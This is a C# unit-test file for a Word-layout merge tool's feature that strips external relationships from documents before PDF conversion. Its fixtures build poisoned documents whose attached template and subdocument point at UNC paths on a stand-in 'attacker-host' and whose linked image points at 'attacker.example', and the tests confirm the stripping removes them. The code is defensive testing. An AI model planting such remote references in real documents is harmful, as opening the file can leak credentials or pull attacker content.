using BcWordLayout.Domain;
using BcWordLayout.Merge;
using DocumentFormat.OpenXml;
using DocumentFormat.OpenXml.Packaging;
using DocumentFormat.OpenXml.Validation;
using DocumentFormat.OpenXml.Wordprocessing;
using A = DocumentFormat.OpenXml.Drawing;
using DW = DocumentFormat.OpenXml.Drawing.Wordprocessing;
using PIC = DocumentFormat.OpenXml.Drawing.Pictures;

namespace BcWordLayout.Tests;

/// <summary>
/// Covers <see cref="ExternalRelationshipStripper"/>: the
/// opt-in <see cref="MergeOptions.StripExternalRelationships"/> step <c>preview_layout</c> enables before
/// handing its merged copy to a PDF converter. Exercises the internal
/// <see cref="MergeEngine.Merge(WordprocessingDocument, SampleDataset, MergeOptions?)"/> overload directly
/// against hand-built documents (see <see cref="MergeEngineTests"/> for the same pattern) rather than the
/// tool surface, since this is a Merge-level concern; <see cref="McpHostToolTests"/> covers the
/// <c>preview_layout</c>-level wiring (real corpus attachedTemplate, never-modify-the-original invariant).
/// </summary>
public class ExternalRelationshipStripperTests
{
    private const string RelationshipsNamespace = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
    private const string AttachedTemplateRelationshipType = RelationshipsNamespace + "/attachedTemplate";
    private const string ImageRelationshipType = RelationshipsNamespace + "/image";
    private const string SubDocumentRelationshipType = RelationshipsNamespace + "/subDocument";

    private static (string LayoutPath, SampleDataset Dataset) MinimalLayout()
    {
        var body = SyntheticLayout.BoundField(
            "/ns0:NavWordReportXmlPart[1]/ns0:Header[1]/ns0:CompanyName[1]", SyntheticLayout.GoodItemId);
        var layoutPath = SyntheticLayout.Create(body);
        var schema = SchemaProvider.FromLayout(layoutPath);
        var dataset = SampleDataGenerator.Generate(schema, new SampleDataOptions { Seed = 1, Rows = 1 });
        return (layoutPath, dataset);
    }

    [Fact]
    public void AttachedTemplate_relationship_pointing_at_a_UNC_path_is_stripped_and_reported()
    {
        var (layoutPath, dataset) = MinimalLayout();

        try
        {
            using var doc = WordprocessingDocument.Open(layoutPath, true);
            var main = doc.MainDocumentPart!;
            var settingsPart = main.AddNewPart<DocumentSettingsPart>();
            var rel = settingsPart.AddExternalRelationship(
                AttachedTemplateRelationshipType, new Uri(@"\\attacker-host\share\evil-template.dotx"));
            settingsPart.Settings = new Settings(new AttachedTemplate { Id = rel.Id });
            settingsPart.Settings.Save();

            var result = MergeEngine.Merge(doc, dataset, new MergeOptions { StripExternalRelationships = true });

            var warning = Assert.Single(result.Warnings, w => w.Kind == "external-relationship-stripped");
            Assert.Contains("attachedTemplate", warning.Message);
            Assert.Contains("attacker-host", warning.Message);
            Assert.Equal("settings.xml", warning.Location);

            // The relationship itself is gone...
            Assert.Empty(settingsPart.ExternalRelationships);

            // ...and so is the now-dangling element (its r:id is schema-required - leaving it with the
            // attribute merely cleared would itself be invalid OOXML).
            Assert.Empty(settingsPart.Settings.Elements<AttachedTemplate>());

            // No structural damage: a full validator pass over the merged, in-memory document is clean.
            var errors = new OpenXmlValidator(FileFormatVersions.Office2019).Validate(doc).ToList();
            Assert.True(errors.Count == 0,
                "expected zero validation errors; found: "
                + string.Join(" | ", errors.Select(e => $"{e.Path?.XPath}: {e.Description}")));
        }
        finally
        {
            File.Delete(layoutPath);
        }
    }

    /// <summary>
    /// <c>w:subDoc</c> (<see cref="SubDocumentReference"/>) is one of NINE <c>DocumentFormat.OpenXml.
    /// Wordprocessing</c> types sharing the SDK's internal <c>RelationshipType</c> base — the same "CT_Rel"
    /// shape as <see cref="AttachedTemplate"/>: a standalone element whose ONLY content is a SCHEMA-REQUIRED
    /// <c>r:id</c>. Confirmed empirically (element-scoped <see cref="OpenXmlValidator"/>, no surrounding
    /// document needed): a bare <see cref="SubDocumentReference"/> with no <see cref="SubDocumentReference.Id"/>
    /// set always reports "The required attribute 'id' is missing" — exactly the defect class the
    /// reviewer flagged (the docstring previously, incorrectly, implied subDoc was safe to attribute-clear).
    /// Nested inside a body paragraph (confirmed valid there via a full round-trip <see cref="OpenXmlValidator"/>
    /// pass, both with the id present and after removing the relationship+element) so this test proves the
    /// SAME whole-document-clean outcome the attachedTemplate test proves, for a DIFFERENT member of the
    /// same required-id element family — not just "the element type-checks in isolation".
    /// </summary>
    [Fact]
    public void SubDocumentReference_relationship_pointing_at_a_UNC_path_is_stripped_and_reported()
    {
        var (layoutPath, dataset) = MinimalLayout();

        try
        {
            using var doc = WordprocessingDocument.Open(layoutPath, true);
            var main = doc.MainDocumentPart!;
            var rel = main.AddExternalRelationship(
                SubDocumentRelationshipType, new Uri(@"\\attacker-host\share\evil-subdoc.doc"));
            main.Document!.Body!.InsertAt(new Paragraph(new SubDocumentReference { Id = rel.Id }), 0);
            main.Document.Save();

            var result = MergeEngine.Merge(doc, dataset, new MergeOptions { StripExternalRelationships = true });

            var warning = Assert.Single(
                result.Warnings, w => w.Kind == "external-relationship-stripped" && w.Message.Contains("subDocument"));
            Assert.Contains("attacker-host", warning.Message);
            Assert.Equal("document.xml", warning.Location);

            // The relationship itself is gone...
            Assert.DoesNotContain(main.ExternalRelationships, r => r.Id == rel.Id);

            // ...and so is the now-dangling element (its r:id is schema-required, same shape as
            // attachedTemplate - leaving it with the attribute merely cleared would itself be invalid OOXML).
            Assert.Empty(main.Document.Descendants<SubDocumentReference>());

            var errors = new OpenXmlValidator(FileFormatVersions.Office2019).Validate(doc).ToList();
            Assert.True(errors.Count == 0,
                "expected zero validation errors; found: "
                + string.Join(" | ", errors.Select(e => $"{e.Path?.XPath}: {e.Description}")));
        }
        finally
        {
            File.Delete(layoutPath);
        }
    }

    [Fact]
    public void StripExternalRelationships_defaults_to_false_and_leaves_attachedTemplate_untouched()
    {
        var (layoutPath, dataset) = MinimalLayout();

        try
        {
            using var doc = WordprocessingDocument.Open(layoutPath, true);
            var main = doc.MainDocumentPart!;
            var settingsPart = main.AddNewPart<DocumentSettingsPart>();
            var rel = settingsPart.AddExternalRelationship(
                AttachedTemplateRelationshipType, new Uri(@"\\attacker-host\share\evil-template.dotx"));
            settingsPart.Settings = new Settings(new AttachedTemplate { Id = rel.Id });
            settingsPart.Settings.Save();

            // Options with StripExternalRelationships omitted (defaults false) - mirrors validate_layout
            // level=full's FullValidator dry-run merge, whose throwaway output is never opened by a
            // converter, so it deliberately never strips (see FullValidator.Full's own remarks).
            var result = MergeEngine.Merge(doc, dataset, new MergeOptions());

            Assert.DoesNotContain(result.Warnings, w => w.Kind == "external-relationship-stripped");
            Assert.Single(settingsPart.ExternalRelationships);
            Assert.Single(settingsPart.Settings.Elements<AttachedTemplate>());
        }
        finally
        {
            File.Delete(layoutPath);
        }
    }

    [Fact]
    public void Hyperlink_relationship_and_its_referencing_element_survive_the_strip()
    {
        const string HyperlinkRelId = "rIdHyperlinkTest";
        var body = SyntheticLayout.BoundField(
            "/ns0:NavWordReportXmlPart[1]/ns0:Header[1]/ns0:CompanyName[1]", SyntheticLayout.GoodItemId)
            + SyntheticLayout.HyperlinkParagraph(HyperlinkRelId);
        var layoutPath = SyntheticLayout.Create(body);

        try
        {
            var schema = SchemaProvider.FromLayout(layoutPath);
            var dataset = SampleDataGenerator.Generate(schema, new SampleDataOptions { Seed = 1, Rows = 1 });

            using var doc = WordprocessingDocument.Open(layoutPath, true);
            var main = doc.MainDocumentPart!;
            main.AddHyperlinkRelationship(new Uri("https://example.com/invoice"), true, HyperlinkRelId);

            // Also add a poisoned attachedTemplate in the SAME document/part tree, so this test proves
            // SELECTIVE stripping (the hyperlink survives while a genuine external relationship right next
            // to it is removed), not merely "nothing was touched because nothing else was external".
            var settingsPart = main.AddNewPart<DocumentSettingsPart>();
            var attachedRel = settingsPart.AddExternalRelationship(
                AttachedTemplateRelationshipType, new Uri(@"\\attacker-host\share\evil.dotx"));
            settingsPart.Settings = new Settings(new AttachedTemplate { Id = attachedRel.Id });
            settingsPart.Settings.Save();

            var result = MergeEngine.Merge(doc, dataset, new MergeOptions { StripExternalRelationships = true });

            // The unrelated attachedTemplate WAS stripped (selective, not "everything survived").
            Assert.Contains(result.Warnings, w => w.Kind == "external-relationship-stripped");
            Assert.Empty(settingsPart.ExternalRelationships);

            // The hyperlink relationship itself still resolves...
            var hyperlink = Assert.Single(main.HyperlinkRelationships);
            Assert.Equal(HyperlinkRelId, hyperlink.Id);
            Assert.Equal("https://example.com/invoice", hyperlink.Uri.ToString());

            // ...and the w:hyperlink element in the body still references it by that same id - never
            // touched, since HyperlinkRelationship is a separate collection from ExternalRelationships (see
            // ExternalRelationshipStripper's own remarks) and is explicitly skipped even when it does show up.
            var hyperlinkElement = main.Document!.Descendants<Hyperlink>().Single();
            Assert.Equal(HyperlinkRelId, hyperlinkElement.Id?.Value);
        }
        finally
        {
            File.Delete(layoutPath);
        }
    }

    /// <summary>Builds a minimal, schema-valid inline picture <c>w:drawing</c> whose blip is EITHER
    /// externally linked (<paramref name="linkRelId"/>, <c>a:blip/@r:link</c>) or embedded
    /// (<paramref name="embedRelId"/>, <c>a:blip/@r:embed</c>) - mirrors the real corpus picture shape
    /// (see <c>Snapshots/SalesInvoiceForSubscriptionBilling.docx.document.xml</c>) closely enough to
    /// validate cleanly, without needing a real add-in-authored fixture.</summary>
    private static Drawing PictureDrawing(uint docPrId, string? linkRelId, string? embedRelId)
    {
        // NOTE: assigning `Embed = null`/`Link = null` directly (rather than leaving the property
        // altogether unset) triggers the implicit string->StringValue conversion operator on the null
        // VALUE, producing a StringValue instance whose own Value is null - which OpenXmlValidator then
        // reports as "the attribute value cannot be empty" (an attribute that IS present, just empty)
        // rather than the attribute being absent entirely. Only ever set the property when there is a
        // real id, exactly like a real BC picture control (always exactly one of embed/link, never both).
        var blip = new A.Blip();
        if (linkRelId is not null)
        {
            blip.Link = linkRelId;
        }

        if (embedRelId is not null)
        {
            blip.Embed = embedRelId;
        }

        var picture = new PIC.Picture(
            new PIC.NonVisualPictureProperties(
                new PIC.NonVisualDrawingProperties { Id = 0U, Name = "picture.png" },
                new PIC.NonVisualPictureDrawingProperties()),
            new PIC.BlipFill(blip, new A.Stretch(new A.FillRectangle())),
            new PIC.ShapeProperties(
                new A.Transform2D(
                    new A.Offset { X = 0L, Y = 0L },
                    new A.Extents { Cx = 990000L, Cy = 792000L }),
                new A.PresetGeometry(new A.AdjustValueList()) { Preset = A.ShapeTypeValues.Rectangle }));

        var graphicData = new A.GraphicData(picture)
        {
            Uri = "http://schemas.openxmlformats.org/drawingml/2006/picture",
        };

        var inline = new DW.Inline(
            new DW.Extent { Cx = 990000L, Cy = 792000L },
            new DW.EffectExtent { LeftEdge = 0L, TopEdge = 0L, RightEdge = 0L, BottomEdge = 0L },
            new DW.DocProperties { Id = docPrId, Name = $"Picture {docPrId}" },
            new DW.NonVisualGraphicFrameDrawingProperties(new A.GraphicFrameLocks { NoChangeAspect = true }),
            new A.Graphic(graphicData))
        {
            DistanceFromTop = 0U,
            DistanceFromBottom = 0U,
            DistanceFromLeft = 0U,
            DistanceFromRight = 0U,
        };

        return new Drawing(inline);
    }

    /// <summary>Inserts <paramref name="paragraph"/> as the last CONTENT paragraph of
    /// <paramref name="body"/> - i.e. immediately before its trailing <c>w:sectPr</c> (which the schema
    /// requires to be body's LAST child), rather than <c>AppendChild</c>ing after it.</summary>
    private static void InsertContentParagraph(Body body, Paragraph paragraph)
    {
        var sectPr = body.GetFirstChild<SectionProperties>();
        if (sectPr is not null)
        {
            sectPr.InsertBeforeSelf(paragraph);
        }
        else
        {
            body.AppendChild(paragraph);
        }
    }

    [Fact]
    public void Externally_linked_image_relationship_is_stripped_while_a_sibling_embedded_image_is_untouched()
    {
        const string ExternalImgRelId = "rIdExternalImgTest";
        var (layoutPath, dataset) = MinimalLayout();

        try
        {
            using var doc = WordprocessingDocument.Open(layoutPath, true);
            var main = doc.MainDocumentPart!;

            // A real embedded ImagePart (internal relationship - AddImagePart never produces an
            // ExternalRelationship) sits right next to the externally-linked one, so this test proves the
            // strip is selective at the ATTRIBUTE level too, not just "one blip vs. another element type".
            var imagePart = main.AddImagePart(ImagePartType.Png);
            using (var pngStream = new MemoryStream(PlaceholderImage.PngBytes))
            {
                imagePart.FeedData(pngStream);
            }

            var embedRelId = main.GetIdOfPart(imagePart);
            main.AddExternalRelationship(
                ImageRelationshipType, new Uri("http://attacker.example/evil.png"), ExternalImgRelId);

            var body = main.Document!.Body!;
            InsertContentParagraph(body, new Paragraph(new Run(PictureDrawing(1U, linkRelId: ExternalImgRelId, embedRelId: null))));
            InsertContentParagraph(body, new Paragraph(new Run(PictureDrawing(2U, linkRelId: null, embedRelId: embedRelId))));
            main.Document!.Save();

            var result = MergeEngine.Merge(doc, dataset, new MergeOptions { StripExternalRelationships = true });

            var warning = Assert.Single(result.Warnings, w => w.Kind == "external-relationship-stripped");
            Assert.Contains("image", warning.Message);

            Assert.DoesNotContain(main.ExternalRelationships, r => r.Id == ExternalImgRelId);

            var blips = main.Document.Descendants<A.Blip>().ToList();
            Assert.Equal(2, blips.Count);
            Assert.Contains(blips, b => string.IsNullOrEmpty(b.Link?.Value) && b.Embed?.Value == embedRelId);
            Assert.Contains(blips, b => string.IsNullOrEmpty(b.Link?.Value) && string.IsNullOrEmpty(b.Embed?.Value));

            var errors = new OpenXmlValidator(FileFormatVersions.Office2019).Validate(doc).ToList();
            Assert.True(errors.Count == 0,
                "expected zero validation errors; found: "
                + string.Join(" | ", errors.Select(e => $"{e.Path?.XPath}: {e.Description}")));
        }
        finally
        {
            File.Delete(layoutPath);
        }
    }
}
